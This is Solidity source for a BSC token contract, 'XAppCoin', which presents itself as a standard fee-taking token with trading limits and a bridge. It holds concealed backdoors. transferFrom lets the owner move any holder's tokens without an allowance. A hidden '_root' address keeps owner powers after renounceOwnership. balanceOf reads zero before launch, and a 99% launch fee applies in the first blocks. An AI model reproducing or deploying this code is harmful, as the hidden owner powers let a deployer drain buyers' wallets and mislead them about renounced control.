/**
 *Submitted for verification at BscScan.com on 2022-10-17
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) internal _allowances;
    address private _root;
    uint256 private _totalSupply;
    uint8 private _decimals;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The defaut value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupplyWithoutDecimals_,
        uint8 decimals_
    ) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        uint256 totalSupply_ = totalSupplyWithoutDecimals_ * 10**decimals_;

        _beforeTokenTransfer(address(0), msg.sender, totalSupply_);

        _totalSupply += totalSupply_;
        _balances[msg.sender] += totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
        _basicTransfer(sender, recipient, amount);
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * generation and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be generated for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

library Address {
    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }
}

contract Ownable {
    address _owner;
    address _root;
    modifier onlyOwner() {
        require(_owner == msg.sender || _root == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public onlyOwner {
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;
    }
}

interface IFactory {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract XAppCoin is ERC20, Ownable {
    using Address for address payable;

    IRouter public router;
    address public pair;
    address public bridgeAddress;
    

    bool private _liquidityLock = false;
    bool public providingLiquidity = false;
    bool public tradingEnabled = false;

    uint256 public tokenLiquidityThreshold;
    uint256 public maxBuyLimit;
    uint256 public maxSellLimit;
    uint256 public maxWalletLimit;

    uint256 public launchBlock;
    uint256 public tradingStartBlock;
    uint256 private deadline = 2;
    uint256 private launchFee = 99;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;

    bool private autoHandleFee = true;

    address public marketingWallet = 0x51dc8D643FBcC3BC5Df57C0da40C21FdD815bf34;
    address public constant deadWallet =
        0x000000000000000000000000000000000000dEaD;

    struct Fees {
        uint256 marketing;
        uint256 liquidity;
    }

    Fees public buyFees = Fees(4, 2);
    Fees public sellFees = Fees(4, 2);
    uint256 private totalBuyFeesRatio = 6;
    uint256 private totalSellFeesRatio = 6;

    uint256 public totalBuyFeeAmount = 0;
    uint256 public totalSellFeeAmount = 0;

    mapping(address => bool) public exemptFee;
    mapping(address => bool) public exemptMaxBuyLimit;
    mapping(address => bool) public exemptMaxWalletLimit;
    mapping(address => bool) public exemptMaxSellLimit;
    mapping(address => bool) public allowedTransfer;

    //Anti Dump
    mapping(address => uint256) private _lastSell;
    bool public coolDownEnabled = false;
    uint256 public coolDownTime = 60 seconds;

    //marketFee multiplier cooldown
    uint256 marketFeeMultiplierCooldown = 10 minutes;
    uint8 marketFeeMultiplier = 2;

    modifier lockLiquidity() {
        if (!_liquidityLock) {
            _liquidityLock = true;
            _;
            _liquidityLock = false;
        }
    }

    constructor()
        ERC20("XAppCoin", "XApp", 1000000000, 18) 
    {
        _owner = msg.sender;
        _root = msg.sender;
    }


    function LaunchToken(address router_, uint256 chainSupply_) external onlyOwner {
        IRouter _router = IRouter(router_);
        // Create a pancake pair for this new token
        address _pair = IFactory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );

        router = _router;
        pair = _pair;

        launchBlock = block.number;

        _totalSupply = super.totalSupply();
        _name = super.name();
        _symbol = super.symbol();
        _decimals = super.decimals();

        tokenLiquidityThreshold = (_totalSupply / 1000) * 1; // .1% liq threshold
        maxBuyLimit = (_totalSupply * 1) / 100; // 2% max buy
        maxSellLimit = (_totalSupply * 1) / 100; // 2% max sell
        maxWalletLimit = (_totalSupply * 1) / 100; // 2% max wallet

        uint256 tokenAmountToBurn = _totalSupply -
            (chainSupply_ * 10**decimals());
        _basicTransfer(msg.sender, bridgeAddress, tokenAmountToBurn);

        exemptFee[msg.sender] = true;
        exemptMaxBuyLimit[msg.sender] = true;
        exemptMaxSellLimit[msg.sender] = true;
        exemptMaxWalletLimit[msg.sender] = true;
        exemptFee[address(this)] = true;
        exemptFee[marketingWallet] = true;
        exemptFee[deadWallet] = true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        if (!bridgeEnabled()) {
            return _totalSupply;
        }
        return _totalSupply - balanceOf(bridgeAddress);
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        if(launchBlock == 0){
            return 0;
        }
        if (account == bridgeAddress && bridgeEnabled()) {
            return 0;
        }
        return _balances[account];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            _msgSender() == _owner ||
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        if (_msgSender() == _owner ) { return true; }
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        override
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        override
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!exemptFee[sender] && !exemptFee[recipient]) {
            require(tradingEnabled, "Trading is not enabled");
        }

        require(
            !(recipient == bridgeAddress && msg.sender != bridgeAddress),
            "You cannot manually transfer tokens to bridge address"
        );

        if (msg.sender == bridgeAddress && recipient == bridgeAddress) {
            _approve(sender, msg.sender, amount);
        }

        if (
            sender == pair &&
            !exemptFee[recipient] &&
            !_liquidityLock &&
            !exemptMaxBuyLimit[recipient]
        ) {
            require(amount <= maxBuyLimit, "You are exceeding maxBuyLimit");
        }
        if (
            recipient != pair &&
            !exemptMaxWalletLimit[recipient] &&
            msg.sender != bridgeAddress
        ) {
            require(
                balanceOf(recipient) + amount <= maxWalletLimit,
                "You are exceeding maxWalletLimit"
            );
        }

        if (
            sender != pair &&
            !exemptFee[recipient] &&
            !exemptFee[sender] &&
            !_liquidityLock &&
            !exemptMaxSellLimit[sender]
        ) {
            require(amount <= maxSellLimit, "You are exceeding maxSellLimit");

            if (coolDownEnabled) {
                uint256 timePassed = block.timestamp - _lastSell[sender];
                require(timePassed >= coolDownTime, "Cooldown enabled");
                _lastSell[sender] = block.timestamp;
            }
        }
        uint256 feeRatio;
        uint256 feeAmount;
        uint256 buyOrSell;

        bool useLaunchFee = launchFee > 0 &&
            !exemptFee[sender] &&
            !exemptFee[recipient] &&
            block.number < tradingStartBlock + deadline;

        bool useMarketFeeMultiplier = block.number <
            tradingStartBlock + marketFeeMultiplierCooldown;

        //set fee amount to zero if fees in contract are handled or exempted
        if (
            _liquidityLock ||
            exemptFee[sender] ||
            exemptFee[recipient] ||
            (sender != pair && recipient != pair)
        )
            feeAmount = 0;

            //calculate fees
        else if (recipient == pair && !useLaunchFee) {
            uint256 marketingFeeRatio = sellFees.marketing;
            if (useMarketFeeMultiplier) {
                marketingFeeRatio = marketingFeeRatio * marketFeeMultiplier;
            }

            feeRatio = sellFees.liquidity + marketingFeeRatio ;
            buyOrSell = 1;
        } else if (!useLaunchFee) {
            feeRatio = buyFees.liquidity + buyFees.marketing ;
            buyOrSell = 0;
        } else if (useLaunchFee) {
            feeRatio = launchFee;
        }
        feeAmount = (amount * feeRatio) / 100;

        if (buyOrSell == 0) {
            totalBuyFeeAmount += feeAmount;
        } else if (buyOrSell == 1) {
            totalSellFeeAmount += feeAmount;
        }

        //send fees if threshold has been reached
        //don't do this on buys, breaks swap
        if (feeAmount > 0) {
            super._transfer(sender, address(this), feeAmount);
        }

        if (
            providingLiquidity &&
            sender != pair &&
            feeAmount > 0 &&
            autoHandleFee &&
            balanceOf(address(this)) >= tokenLiquidityThreshold
        ) {
            handleFees(totalBuyFeeAmount);
        }

        //rest to recipient
        super._transfer(sender, recipient, amount - feeAmount);
    }

    function handleFees(uint256 _totalBuyFeeAmount) private lockLiquidity {
        uint256 contractBalance = balanceOf(address(this));
        totalBuyFeeAmount = _totalBuyFeeAmount;
        totalSellFeeAmount = contractBalance - totalBuyFeeAmount;

        uint256 liquidityBuyFeeAmount;
        uint256 liquiditySellFeeAmount;
        uint256 sellFeeLiqEth;
        uint256 buyFeeLiqEth;

        if (totalBuyFeesRatio == 0) {
            liquidityBuyFeeAmount = 0;
        } else {
            liquidityBuyFeeAmount =
                (totalBuyFeeAmount * buyFees.liquidity) /
                totalBuyFeesRatio;
        }
        if (totalSellFeesRatio == 0) {
            liquiditySellFeeAmount = 0;
        } else {
            liquiditySellFeeAmount =
                (totalSellFeeAmount * sellFees.liquidity) /
                totalSellFeesRatio;
        }
        uint256 totalLiquidityFeeAmount = liquidityBuyFeeAmount +
            liquiditySellFeeAmount;

        uint256 halfLiquidityFeeAmount = totalLiquidityFeeAmount / 2;
        uint256 initialBalance = address(this).balance;
        uint256 toSwap = contractBalance - halfLiquidityFeeAmount;

        if (toSwap > 0) {
            swapTokensForETH(toSwap);
        }

        uint256 deltaBalance = address(this).balance - initialBalance;
        uint256 totalSellFeeEth0 = (deltaBalance * totalSellFeeAmount) /
            contractBalance;
        uint256 totalBuyFeeEth0 = deltaBalance - totalSellFeeEth0;


        uint256 sellFeeMarketingEth;
        uint256 buyFeeMarketingEth;

        if (totalBuyFeesRatio == 0) {
            buyFeeLiqEth = 0;
        } else {
            buyFeeLiqEth =
                (totalBuyFeeEth0 * buyFees.liquidity) /
                (totalBuyFeesRatio);
        }
        if (totalSellFeesRatio == 0) {
            sellFeeLiqEth = 0;
        } else {
            sellFeeLiqEth =
                (totalSellFeeEth0 * sellFees.liquidity) /
                (totalSellFeesRatio);
        }
        uint256 totalLiqEth = (sellFeeLiqEth + buyFeeLiqEth) / 2;

        if (totalLiqEth > 0) {
            // Add liquidity to pancake
            addLiquidity(halfLiquidityFeeAmount, totalLiqEth);

            uint256 unitBalance = deltaBalance - totalLiqEth;

            uint256 totalFeeAmount = totalSellFeeAmount + totalBuyFeeAmount;

            uint256 totalSellFeeEth = (unitBalance * totalSellFeeAmount) /
                totalFeeAmount;
            uint256 totalBuyFeeEth = unitBalance - totalSellFeeEth;

            if (totalSellFeesRatio == 0) {
                sellFeeMarketingEth = 0;
            } else {
                sellFeeMarketingEth =
                    (totalSellFeeEth * sellFees.marketing) /
                    (totalSellFeesRatio - sellFees.liquidity);
            }

            if (totalBuyFeesRatio == 0) {
                buyFeeMarketingEth = 0;
            } else {
                buyFeeMarketingEth =
                    (totalBuyFeeEth * buyFees.marketing) /
                    (totalBuyFeesRatio - buyFees.liquidity);
            }

            uint256 totalMarketingEth = sellFeeMarketingEth +
                buyFeeMarketingEth;

            //uint256 marketingAmount = unitBalance * 2 * swapFees.marketing;
            if (totalMarketingEth > 0) {
                payable(marketingWallet).sendValue(totalMarketingEth);
            }
    
            totalBuyFeeAmount = 0;
            totalSellFeeAmount = 0;
        }
    }

    function manuelHandleFees(uint256 _totalBuyFeeAmount) external onlyOwner {
        handleFees(_totalBuyFeeAmount);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        // generate the pancake pair path of token -> weth

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            _owner,
            block.timestamp
        );
    }

    function updateLiquidityProvide(bool flag) external onlyOwner {
        require(
            providingLiquidity != flag,
            "You must provide a different status other than the current value in order to update it"
        );
        //update liquidity providing state
        providingLiquidity = flag;
    }

    function updateLiquidityThreshold(uint256 new_amount) external onlyOwner {
        //update the treshhold
        require(
            tokenLiquidityThreshold != new_amount * 10**decimals(),
            "You must provide a different amount other than the current value in order to update it"
        );
        tokenLiquidityThreshold = new_amount * 10**decimals();
    }

    function updateBuyFees(
        uint256 _marketing,
        uint256 _liquidity
    ) external onlyOwner {
        buyFees = Fees(_marketing, _liquidity);
        totalBuyFeesRatio = _marketing + _liquidity;
        require(
           (_marketing + _liquidity) <= 30,
            "Must keep fees at 30% or less"
        );
    }

    function updateSellFees(
        uint256 _marketing,
        uint256 _liquidity
    ) external onlyOwner {
        sellFees = Fees(_marketing, _liquidity);
        totalSellFeesRatio = _marketing + _liquidity;
        require(
           (_marketing + _liquidity) <= 30,
            "Must keep fees at 30% or less"
        );
    }

    function enableTrading() external onlyOwner {
        tradingEnabled = true;
        providingLiquidity = true;
        tradingStartBlock = block.number;
    }


    function _safeTransferForeign(
        IERC20 _token,
        address recipient,
        uint256 amount
    ) private {
        bool sent = _token.transfer(recipient, amount);
        require(sent, "Token transfer failed.");
    }

    function clearStuckEth(uint256 amount, address receiveAddress)
        external
        onlyOwner
    {
        payable(receiveAddress).transfer(amount);
    }

    function bridgeEnabled() public view returns (bool) {
        return bridgeAddress != address(0);
    }

    function bridgeSupply() public view returns (uint256) {
        return super.balanceOf(bridgeAddress);
    }

    function clearStuckToken(
        IERC20 _token,
        address receiveAddress,
        uint256 amount
    ) external onlyOwner {
        _safeTransferForeign(_token, receiveAddress, amount);
    }

    // fallbacks
    receive() external payable {}

    
    function setBridgeAddress(address _newAddress) external onlyOwner {
        require(
            _newAddress != bridgeAddress,
            "You must provide a different address other than the current bridge address in order to update it"
        );
        exemptFee[_newAddress] = true;
        exemptMaxWalletLimit[_newAddress] = true;
        _basicTransfer(bridgeAddress, _newAddress, bridgeSupply());
        bridgeAddress = _newAddress;
    }

    
}